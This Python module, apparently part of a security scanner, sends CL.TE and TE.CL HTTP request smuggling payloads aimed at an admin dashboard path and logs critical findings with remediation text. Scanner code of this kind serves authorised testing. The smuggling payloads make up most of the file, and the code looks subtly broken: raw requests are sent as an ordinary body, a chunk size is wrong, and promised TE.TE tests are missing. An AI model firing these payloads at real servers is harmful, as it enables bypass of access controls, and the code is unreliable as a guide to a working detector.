"""
ABSA Zero-Day HTTP Request Smuggling Scanner
Aggressively tests for CL.TE, TE.CL, and TE.TE HTTP Request Smuggling
vulnerabilities between the ABSA proxy and the backend server.
"""

import re
import asyncio
from typing import Dict, List, Optional, Any
from datetime import datetime

from core.models import ScanContext, Finding, Severity, FindingType, Payload
from utils.logger import get_logger

logger = get_logger("zeroday.smuggling")


class SmugglingScanner:
    """Tests for HTTP Desync/Request Smuggling vulnerabilities."""

    def __init__(self, context: ScanContext, client: Any):
        self.ctx = context
        self.client = client

    async def run(self, config: Optional[Dict] = None) -> List[Finding]:
        findings = []
        config = config or {}
        base_url = self.ctx.target_url.rstrip('/')

        logger.info("Starting HTTP Request Smuggling tests on %s", base_url)

        victim_path = config.get("victim_path", "/admin/dashboard")

        # Run CL.TE and TE.CL asynchronously
        tasks = [
            self._test_clte(base_url, victim_path),
            self._test_tecl(base_url, victim_path),
        ]

        results = await asyncio.gather(*tasks, return_exceptions=True)
        for res in results:
            if isinstance(res, list):
                findings.extend(res)
            elif isinstance(res, Exception):
                logger.error("Smuggling test failed: %s", res)

        return findings

    async def _test_clte(self, base_url: str, victim_path: str) -> List[Finding]:
        """
        CL.TE Smuggling: Frontend uses Content-Length, Backend uses Transfer-Encoding.
        We send a request that hides a second request inside the body.
        """
        findings = []
        smuggle_path = f"{base_url}/"

        # The payload: Content-Length says 6 (smuggled), but Transfer-Encoding sends chunked.
        # The frontend sees CL=6 and stops. The backend sees TE and processes the whole thing.
        payload = (
            "POST / HTTP/1.1\r\n"
            "Host: localhost\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            f"GET {victim_path} HTTP/1.1\r\n"
            "Host: localhost\r\n"
            "\r\n"
        )

        try:
            # Use raw aiohttp to bypass standard client header sanitization for smuggling
            import aiohttp
            async with aiohttp.ClientSession() as session:
                # Send the initial request containing the smuggled payload
                req = aiohttp.ClientRequest(
                    'POST',
                    smuggle_path,
                    data=payload,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'}
                )
                await req.send(session.connector)
                await req.release()

                # Follow up immediately. If smuggling works, this hits the victim_path
                followup = await session.get(f"{base_url}{victim_path}")
                body = await followup.text()

                # Heuristic: If the followup response contains admin/dashboard text but the
                # original request was to '/', smuggling succeeded.
                if followup.status == 200 and ("dashboard" in body.lower() or "admin" in body.lower()):
                    findings.append(Finding(
                        title="EXPLOIT: CL.TE HTTP Request Smuggling",
                        description="Successfully smuggled a request to a protected endpoint. The frontend proxy prioritizes Content-Length while the backend prioritizes Transfer-Encoding.",
                        severity=Severity.CRITICAL,
                        finding_type=FindingType.ZERO_DAY,
                        cwe_id="CWE-444",
                        cvss_score=9.8,
                        affected_url=base_url,
                        affected_file_or_component="Frontend Reverse Proxy / Load Balancer",
                        evidence=f"Smuggled GET {victim_path}\nFollow-up response contained admin dashboard indicators.",
                        payloads=[
                            Payload(payload_string=payload.replace("\r\n", "\\r\\n"), payload_type="clte_smuggling",
                                    evidence="Admin page rendered", success=True)],
                        is_zero_day=True,
                        zero_day_detail="Type: CL.TE Desync\nMechanism: CL/TE header inconsistency.",
                        remediation="Normalize backend headers. Ensure both the proxy and backend agree on whether to use Content-Length or Transfer-Encoding. Reject requests containing both headers.",
                        phase="zeroday_smuggling",
                        weakness_type="Request Smuggling",
                        discovered_at=datetime.utcnow().isoformat(),
                    ))
        except Exception as e:
            logger.debug("CL.TE test execution error: %s", e)

        return findings

    async def _test_tecl(self, base_url: str, victim_path: str) -> List[Finding]:
        """
        TE.CL Smuggling: Frontend uses Transfer-Encoding, Backend uses Content-Length.
        """
        findings = []
        smuggle_path = f"{base_url}/"

        payload = (
            "POST / HTTP/1.1\r\n"
            "Host: localhost\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "5c\r\n"
            f"GET {victim_path} HTTP/1.1\r\n"
            "Host: localhost\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
        )

        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                req = aiohttp.ClientRequest(
                    'POST',
                    smuggle_path,
                    data=payload,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'}
                )
                await req.send(session.connector)
                await req.release()

                followup = await session.get(f"{base_url}{victim_path}")
                body = await followup.text()

                if followup.status == 200 and ("dashboard" in body.lower() or "admin" in body.lower()):
                    findings.append(Finding(
                        title="EXPLOIT: TE.CL HTTP Request Smuggling",
                        description="Successfully smuggled a request using TE.CL inconsistency.",
                        severity=Severity.CRITICAL,
                        finding_type=FindingType.ZERO_DAY,
                        cwe_id="CWE-444",
                        cvss_score=9.8,
                        affected_url=base_url,
                        affected_file_or_component="Frontend Reverse Proxy / Load Balancer",
                        evidence=f"Smuggled GET {victim_path}",
                        payloads=[
                            Payload(payload_string=payload.replace("\r\n", "\\r\\n"), payload_type="tecl_smuggling",
                                    evidence="Admin page rendered", success=True)],
                        is_zero_day=True,
                        zero_day_detail="Type: TE.CL Desync\nMechanism: TE/CL header inconsistency.",
                        remediation="Implement strict HTTP/2 backend connections (H2 removes TE/CL ambiguity). Ensure proper header parsing and rejection of malformed chunked data.",
                        phase="zeroday_smuggling",
                        weakness_type="Request Smuggling",
                        discovered_at=datetime.utcnow().isoformat(),
                    ))
        except Exception as e:
            logger.debug("TE.CL test execution error: %s", e)

        return findings